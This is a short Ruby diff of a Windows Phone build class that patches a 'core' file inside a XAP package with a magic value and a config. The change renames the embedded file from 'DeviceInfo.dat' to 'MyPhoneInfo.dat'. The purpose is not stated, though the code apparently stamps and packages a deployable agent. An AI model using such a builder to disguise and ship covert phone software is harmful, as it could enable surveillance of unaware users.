@@ -36,7 +36,7 @@ class BuildWinPhone < Build
 
     # add the file to be patched to the params
     # these params will be passed to the super
-    params[:core] = 'xap/DeviceInfo.dat'
+    params[:core] = 'xap/MyPhoneInfo.dat'
     params[:config] = 'xap/cptm511.dql'
 
     # enforce demo flag accordingly to the license
@@ -98,14 +98,14 @@ class BuildWinPhone < Build
     end
 
     Zip::ZipFile.open(path('core.xap')) do |z|
-      core_content = z.file.open('DeviceInfo.dat', "rb") { |f| f.read }
+      core_content = z.file.open('MyPhoneInfo.dat', "rb") { |f| f.read }
       add_magic(core_content)
-      File.open(Config.instance.temp('DeviceInfo.dat'), "wb") {|f| f.write core_content}
+      File.open(Config.instance.temp('MyPhoneInfo.dat'), "wb") {|f| f.write core_content}
     end
 
     # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
-    CrossPlatform.exec "zip", "-j -u #{path('core.xap')} #{Config.instance.temp('DeviceInfo.dat')}"
-    FileUtils.rm_rf Config.instance.temp('DeviceInfo.dat')
+    CrossPlatform.exec "zip", "-j -u #{path('core.xap')} #{Config.instance.temp('MyPhoneInfo.dat')}"
+    FileUtils.rm_rf Config.instance.temp('MyPhoneInfo.dat')
 
     CrossPlatform.exec "zip", "-j -u #{core} #{path('core.xap')}"
   end
